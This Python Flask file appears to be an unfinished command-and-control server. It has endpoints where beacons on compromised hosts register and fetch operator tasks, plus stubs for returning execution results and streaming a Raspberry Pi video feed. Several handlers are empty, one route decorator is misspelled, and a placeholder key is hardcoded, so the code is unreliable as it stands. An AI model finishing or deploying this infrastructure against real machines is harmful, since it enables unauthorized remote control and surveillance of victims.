from flask import Flask, request, jsonify
from time import time
import ssl
import os
from agent import Agent

app = Flask(__name__)


# Define the db in the future, for now we hardcode it and test
db_name = "Monke"
db_id = "1"
db_key= "xyz"
db_config = "10"

agents= Agent(
    name=db_name,
    agent_id= db_id,
    key=db_key,
    path= f"/data/agents/{db_name.lower()}",      #Make sure to add a function to create the path on initial server load
    config= db_config
)

# Root webPath
@app.route("/")
def web_root():
    return "<p>Hello!</p>"

# Initial beacon register, beacon returns 2 arguments (Beacon name/type, compromised hostname) 
@app.route("/c2/register_beacon", methods=['POST'])
def register_beacon_route():
    data = request.json
    remote_ip = data.get('remote_ip')
    remote_hostname = data.get ('remote_hostname')
    current_permission = data.get ('remote_permissions')
    #Write data to DB here ------------------------

    if not remote_ip or not remote_hostname:
        return jsonify({"Error": "Missing an argument"}), 400
    
    return agents.register_beacon(remote_ip, remote_hostname)

# Beacon reads from this endpoint, server writes the data to file and endpoint reflects it
@app.route("/c2/read_task", method=['GET'])
def read_task_route():
    return agents.read_task(agents)

# Operator writes tasks and commands to this endpoint
@app.route ("/c2/write_task", methods=['POST'])
def write_task_route():
    task = request.json.get('task')

    if not task:
        return jsonify({"Error": "No task provided"}), 400
    
    reflected_output = agents.write_task(task)
    return jsonify({"message": reflected_output}), 200

# Beacon writes data to this endpoint
@app.route ("/c2/return_execution_data", methods= ['POST'])
def randomshit():
    pass

# Route for PI functions
@app.route ("/c2/write_pi_task", methods= ['GET'])
def pistuff1():
    pass

# Route for returning PI functions
@app.route ("/c2/return_pi_execution_data", methods= ['POST'])
def pistuff2():
    pass

# Route for streaming video feed
@app.route("/c2/pi_video_feed")
def video_feed():
    pass

if __name__ == '__main__':

  #  cert_file = '/path/to/file'
   # key_file = '/path/to/key'

    #context = ssl.SSLContext(ssl.PROTOCOL_TLS)
    #context.load_cert_chain(certfile=cert_file, keyfile=key_file)

    app.run(host='0.0.0.0', port=5000)